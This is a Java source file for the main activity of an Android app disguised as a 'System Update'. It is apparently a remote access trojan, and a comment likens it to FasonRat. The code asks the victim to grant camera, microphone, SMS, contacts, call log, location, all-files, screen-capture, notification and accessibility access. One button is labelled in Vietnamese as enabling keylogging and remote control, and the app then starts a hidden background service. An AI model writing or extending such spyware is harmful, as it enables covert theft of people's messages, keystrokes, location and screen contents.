package com.zeko.droid;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

public class MainActivity extends Activity {

    private static final int REQ_PERMS = 100;
    private static final int REQ_PROJ = 101;

    /** (nhãn hiển thị, tên quyền) — đúng bộ quyền agent dùng. */
    private static final String[][] PERMS = {
            {"Camera", android.Manifest.permission.CAMERA},
            {"Micro", android.Manifest.permission.RECORD_AUDIO},
            {"Đọc SMS", android.Manifest.permission.READ_SMS},
            {"Nhận SMS", android.Manifest.permission.RECEIVE_SMS},
            {"Gửi SMS", android.Manifest.permission.SEND_SMS},
            {"Danh bạ", android.Manifest.permission.READ_CONTACTS},
            {"Call log", android.Manifest.permission.READ_CALL_LOG},
            {"Vị trí chính xác", android.Manifest.permission.ACCESS_FINE_LOCATION},
            {"Vị trí gần đúng", android.Manifest.permission.ACCESS_COARSE_LOCATION},
            {"Thông tin máy", android.Manifest.permission.READ_PHONE_STATE},
            {"Thông báo", "android.permission.POST_NOTIFICATIONS"}
    };

    private MediaProjectionManager pm;
    private LinearLayout permBox;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Cfg.load(this);
        pm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        String home = Cfg.home();
        boolean setupDone = prefs().getBoolean("setup_done", false);

        // lần đầu luôn mở màn cài đặt để cấp quyền (giống FasonRat); sau đó mới hiện home page
        if (setupDone && home != null && home.length() > 4) {
            setContentView(buildWeb(home));
        } else {
            setContentView(buildSetup());
            if (!setupDone) requestAll();
        }
    }

    @Override protected void onResume() {
        super.onResume();
        refreshPermTable();
    }

    private SharedPreferences prefs() {
        return getSharedPreferences("zk", MODE_PRIVATE);
    }

    // ─────────── trang web hiển thị (home page) ───────────
    private View buildWeb(String url) {
        WebView wv = new WebView(this);
        try {
            WebSettings s = wv.getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setLoadWithOverviewMode(true);
            s.setUseWideViewPort(true);
            wv.setWebViewClient(new WebViewClient());
            wv.loadUrl(url);
        } catch (Throwable ignored) { }

        wv.setOnLongClickListener(v -> {          // giữ lâu -> mở lại cài đặt
            setContentView(buildSetup());
            return true;
        });
        return wv;
    }

    // ─────────── màn hình cài đặt + danh sách quyền ───────────
    private View buildSetup() {
        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(44, 56, 44, 44);
        root.setBackgroundColor(Color.parseColor("#050a14"));

        TextView title = new TextView(this);
        title.setText("🐋  System Update");
        title.setTextSize(21);
        title.setTextColor(Color.parseColor("#22d3ee"));
        title.setOnLongClickListener(v -> { toast(Core.status); return true; });
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("Cấp đủ quyền để app chạy nền.");
        sub.setTextColor(Color.parseColor("#6e8bb0"));
        sub.setPadding(0, 10, 0, 18);
        root.addView(sub);

        permBox = new LinearLayout(this);
        permBox.setOrientation(LinearLayout.VERTICAL);
        root.addView(permBox);

        root.addView(btn("► Cấp tất cả quyền còn thiếu", v -> requestAll()));
        root.addView(btn("► Cho phép truy cập toàn bộ file", v -> openAllFiles()));
        root.addView(btn("2. Bật chia sẻ màn hình", v -> askProjection()));
        root.addView(btn("3. Pin: không tối ưu hoá", v -> openBattery()));
        root.addView(btn("3b. Bật trợ năng (keylog + điều khiển)", v -> openAccessibility()));
        root.addView(btn("3c. Cho phép đọc thông báo", v -> openNotifAccess()));
        root.addView(btn("4. Khởi động dịch vụ", v -> startServiceNow()));

        scroll.addView(root, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT));

        scroll.post(this::refreshPermTable);
        return scroll;
    }

    private Button btn(String text, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(text);
        b.setAllCaps(false);
        b.setOnClickListener(l);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 12);
        b.setLayoutParams(lp);
        return b;
    }

    /** Vẽ lại bảng quyền: mỗi dòng 1 quyền + trạng thái + nút cấp riêng. */
    private void refreshPermTable() {
        if (permBox == null) return;
        permBox.removeAllViews();
        int granted = 0;
        for (String[] p : PERMS) {
            boolean ok = Build.VERSION.SDK_INT < 23
                    || checkSelfPermission(p[1]) == PackageManager.PERMISSION_GRANTED;
            if (ok) granted++;
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setPadding(0, 6, 0, 6);

            TextView t = new TextView(this);
            t.setText((ok ? "✔ " : "✘ ") + p[0]);
            t.setTextSize(14);
            t.setTextColor(Color.parseColor(ok ? "#22e08a" : "#f87171"));
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                    ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
            t.setLayoutParams(lp);
            row.addView(t);

            if (!ok) {
                Button b = new Button(this);
                b.setText("cấp");
                b.setTextSize(12);
                b.setAllCaps(false);
                b.setOnClickListener(v -> requestOne(p[1]));
                row.addView(b);
            }
            permBox.addView(row);
        }
        TextView sum = new TextView(this);
        sum.setText(granted + "/" + PERMS.length + " quyền"
                + (Build.VERSION.SDK_INT >= 30
                    ? (android.os.Environment.isExternalStorageManager() ? " · có All-files" : " · chưa All-files")
                    : ""));
        sum.setTextColor(Color.parseColor("#6e8bb0"));
        sum.setTextSize(12);
        sum.setPadding(0, 4, 0, 14);
        permBox.addView(sum);
    }

    private void requestOne(String perm) {
        if (Build.VERSION.SDK_INT >= 23) requestPermissions(new String[]{perm}, REQ_PERMS);
    }

    private void requestAll() {
        if (Build.VERSION.SDK_INT < 23) { startServiceNow(); return; }
        ArrayList<String> need = new ArrayList<>();
        for (String[] p : PERMS) {
            if (checkSelfPermission(p[1]) != PackageManager.PERMISSION_GRANTED) need.add(p[1]);
        }
        if (Build.VERSION.SDK_INT < 30) {
            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != 0)
                need.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != 0)
                need.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (need.isEmpty()) {
            refreshPermTable();
            startServiceNow();
            return;
        }
        requestPermissions(need.toArray(new String[0]), REQ_PERMS);
    }

    @Override public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        int ok = 0;
        for (int r : res) if (r == 0) ok++;
        toast("Đã cấp " + ok + "/" + res.length + " quyền");
        refreshPermTable();
    }

    private void openAllFiles() {
        if (Build.VERSION.SDK_INT < 30) { toast("Android cũ, không cần"); return; }
        try {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable t) { toast("không mở được"); }
    }

    private void askProjection() {
        if (pm == null) { toast("máy không hỗ trợ MediaProjection"); return; }
        try {
            startActivityForResult(pm.createScreenCaptureIntent(), REQ_PROJ);
        } catch (Throwable t) { toast("lỗi: " + t.getMessage()); }
    }

    @Override protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_PROJ && res == RESULT_OK && data != null) {
            try {
                Media.projection = pm.getMediaProjection(res, data);
                Media.startScreen(this);
                toast("Đã bật chia sẻ màn hình");
            } catch (Throwable t) { toast("lỗi projection: " + t.getMessage()); }
        }
    }

    private void openBattery() {
        try { startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)); }
        catch (Throwable t) { toast("không mở được"); }
    }

    private void openAccessibility() {
        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            toast("Bật 'System Update' trong danh sách trợ năng");
        } catch (Throwable t) { toast("không mở được"); }
    }

    private void openNotifAccess() {
        try {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            toast("Bật 'System Update' trong Notification access");
        } catch (Throwable t) {
            try { startActivity(new Intent(Settings.ACTION_SETTINGS)); } catch (Throwable ignored) { }
        }
    }

    private void startServiceNow() {
        try {
            Intent i = new Intent(this, Core.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
            prefs().edit().putBoolean("setup_done", true).apply();
            toast("Đã chạy nền");
        } catch (Throwable t) { toast("lỗi: " + t.getMessage()); }
    }

    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_SHORT).show(); }
}
